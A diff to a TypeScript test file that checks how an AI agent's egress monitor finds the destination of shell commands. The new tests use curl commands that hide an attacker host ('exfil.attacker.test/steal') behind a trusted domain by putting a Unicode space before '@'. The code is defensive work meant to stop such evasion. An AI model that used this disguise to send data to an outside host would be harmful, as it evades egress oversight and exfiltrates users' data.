@@ -91,6 +91,34 @@ describe("pulling an egress destination out of a shell command", () => {
     ).toEqual({ destination: AMBIGUOUS });
   });
 
+  // #268: the shell does not split on Unicode spaces, so neither may the match.
+  for (const [name, space] of [
+    ["U+FEFF", "\uFEFF"],
+    ["U+00A0", "\u00A0"],
+    ["U+2003", "\u2003"],
+    ["U+3000", "\u3000"],
+  ] as const) {
+    it(`refuses a userinfo hidden behind ${name}, which the shell keeps in the word`, () => {
+      expect(
+        annotateEgressDestination(
+          "egress",
+          {},
+          preliminary({ name: "Bash", args: {}, raw_command: `curl https://docs.anthropic.com${space}@exfil.attacker.test/steal` }),
+        ),
+      ).toEqual({ destination: AMBIGUOUS });
+    });
+  }
+
+  it("still ends the match at an ASCII tab, which the shell does split on", () => {
+    expect(
+      annotateEgressDestination(
+        "egress",
+        {},
+        preliminary({ name: "Bash", args: {}, raw_command: "curl https://docs.anthropic.com/x\t-o out" }),
+      ),
+    ).toEqual({ destination: "https://docs.anthropic.com" });
+  });
+
   it("refuses an authority whose userinfo carries a colon", () => {
     expect(
       annotateEgressDestination(
